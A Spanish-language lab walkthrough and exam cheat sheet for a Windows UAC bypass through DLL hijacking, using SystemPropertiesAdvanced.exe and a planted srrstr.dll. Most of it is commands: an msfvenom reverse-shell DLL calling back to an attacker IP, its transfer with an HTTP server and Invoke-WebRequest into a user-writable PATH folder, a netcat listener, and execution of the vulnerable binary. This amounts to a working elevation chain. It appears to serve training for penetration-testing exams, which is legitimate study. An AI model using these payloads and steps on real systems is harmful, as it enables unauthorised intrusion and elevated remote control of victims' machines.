
## 1. Enumeración

**UAC (User Account Control)** impide que los procesos de un usuario administrador utilicen automáticamente su token elevado.

Un usuario puede pertenecer al grupo `Administrators` y seguir ejecutando comandos con privilegios limitados.

**Importante:** esta técnica no convierte a un usuario estándar en administrador. Permite obtener un proceso elevado cuando nuestra cuenta ya pertenece al grupo `Administrators`.

### Comprobar usuario y grupos

```cmd
whoami /user
whoami /groups
net localgroup Administrators
```

### Comprobar privilegios

```cmd
whoami /priv
```

Si pertenecemos a `Administrators`, pero aparecen pocos privilegios, es posible que estemos utilizando el token filtrado por UAC.

### Comprobar si UAC está habilitado

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

Valores:

- `0x0`: UAC deshabilitado.
- `0x1`: UAC habilitado.

### Comprobar la configuración de UAC

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

En el laboratorio:

```text
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

`0x5` significa que se solicita consentimiento a los administradores para aplicaciones que no son de Windows.

**Nota:** el nivel «Notificar siempre» no se determina únicamente con este valor; también intervienen otras configuraciones, como `PromptOnSecureDesktop`.

### Comprobar la versión de Windows

```powershell
[environment]::OSVersion.Version
```

Ejemplo:

```text
Major  Minor  Build  Revision
10     0      14393  0
```

La compilación `14393` corresponde a Windows 10 versión 1607 y también se utiliza en Windows Server 2016.

La versión es importante porque los métodos de UAC Bypass dependen de la compilación de Windows.

## 2. Explotación — DLL Hijacking

### Técnica utilizada

**UACME Method 54 — SystemPropertiesAdvanced.exe**

El binario:

```text
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

Puede autoelevarse y, en la versión vulnerable del laboratorio, intenta cargar una DLL llamada:

```text
srrstr.dll
```

Podemos aprovechar el orden de búsqueda de DLL de Windows para colocar una DLL maliciosa en un directorio donde tengamos permisos de escritura.

### Paso 1. Comprobar el PATH

Desde CMD:

```cmd
echo %PATH%
```

Desde PowerShell:

```powershell
cmd /c echo %PATH%
```

En el laboratorio aparece:

```text
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps
```

Este directorio pertenece al usuario y permite escritura.

La idea es colocar ahí `srrstr.dll` para que el ejecutable vulnerable la encuentre.

---

## 3. Generar la DLL maliciosa

Desde Kali:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll -o srrstr.dll
```

**Parámetros:**

- `windows/shell_reverse_tcp`: payload de reverse shell de Windows de 32 bits.
- `LHOST`: IP de nuestra interfaz VPN.
- `LPORT`: puerto de escucha.
- `-f dll`: genera una DLL.
- `-o srrstr.dll`: nombre del archivo generado.

Se utiliza un payload de 32 bits porque el ejecutable vulnerable está en `SysWOW64`.

### Paso 2. Transferir la DLL

En Kali:

```bash
python3 -m http.server 8080
```

En el objetivo:

```powershell
Invoke-WebRequest -Uri "http://10.10.14.3:8080/srrstr.dll" -OutFile "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

Sustituir `sarah` por el usuario correspondiente.

### Paso 3. Preparar el listener

En Kali:

```bash
nc -lvnp 8443
```

## 4. Ejecutar el UAC Bypass

### Paso 1. Comprobar procesos anteriores

Si hemos realizado pruebas previas con `rundll32.exe`, podemos buscar sus procesos:

```cmd
tasklist /svc | findstr rundll32
```

Terminar únicamente los procesos que correspondan a nuestras pruebas:

```cmd
taskkill /PID <PID> /F
```

### Paso 2. Ejecutar SystemPropertiesAdvanced.exe

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

En el sistema vulnerable, el ejecutable intentará cargar `srrstr.dll` desde el directorio controlado por el usuario.

Si funciona, recibiremos una reverse shell con el token elevado de nuestra cuenta.

### Paso 3. Verificar los privilegios

En la shell recibida:

```cmd
whoami
whoami /priv
whoami /groups
```

El usuario seguirá siendo el mismo:

```text
winlpe-ws03\sarah
```

Pero ahora tendrá disponibles privilegios administrativos como:

```text
SeDebugPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
SeImpersonatePrivilege
```

Muchos aparecerán como `Disabled`, pero estarán presentes en el token y podrán habilitarse cuando corresponda.

**Importante:** conseguir una shell elevada mediante UAC Bypass no significa obtener `NT AUTHORITY\SYSTEM`. Seguimos siendo nuestro usuario, pero con su token administrativo elevado.

## 5. Resumen para el examen

| Elemento | Descripción |
|---|---|
| Técnica | UAC Bypass mediante DLL Hijacking |
| Requisito | Usuario perteneciente a `Administrators` |
| Herramienta de referencia | UACME |
| Método | 54 |
| Ejecutable vulnerable | `SystemPropertiesAdvanced.exe` |
| Ruta | `C:\Windows\SysWOW64\` |
| DLL secuestrada | `srrstr.dll` |
| Directorio utilizado | `%LOCALAPPDATA%\Microsoft\WindowsApps` |
| Payload | DLL de reverse shell x86 |
| Objetivo | Obtener un token administrativo elevado |
| Verificación | `whoami /priv` y `whoami /groups` |

### Flujo de explotación

```text
Enumerar usuario y grupos
           |
           v
Comprobar pertenencia a Administrators
           |
           v
Comprobar UAC y versión de Windows
           |
           v
Identificar UACME Method 54
           |
           v
Generar srrstr.dll
           |
           v
Colocar DLL en WindowsApps
           |
           v
Preparar listener
           |
           v
Ejecutar SystemPropertiesAdvanced.exe
           |
           v
Recibir shell elevada
```

## 6. Comandos esenciales

### Enumeración

```cmd
whoami /user
whoami /groups
whoami /priv

net localgroup Administrators

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

cmd /c echo %PATH%
```

```powershell
[environment]::OSVersion.Version
```

### Explotación

**Kali:**

```bash
# Generar DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll -o srrstr.dll

# Servidor HTTP
python3 -m http.server 8080

# Listener
nc -lvnp 8443
```

**Windows:**

```powershell
# Descargar DLL
Invoke-WebRequest -Uri "http://10.10.14.3:8080/srrstr.dll" -OutFile "$env:LOCALAPPDATA\Microsoft\WindowsApps\srrstr.dll"

# Ejecutar binario vulnerable
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

**Verificación:**

```cmd
whoami
whoami /groups
whoami /priv
```

### Punto importante

**UAC Bypass ≠ Escalada directa de usuario estándar a administrador.**

Esta técnica permite pasar de:

```text
Usuario administrador con token filtrado
                  |
                  v
          UAC Bypass
                  |
                  v
Mismo usuario con token administrativo elevado
```

Es especialmente útil cuando hemos añadido nuestro usuario al grupo `Administrators`, pero la sesión actual sigue ejecutándose con privilegios limitados debido a UAC.
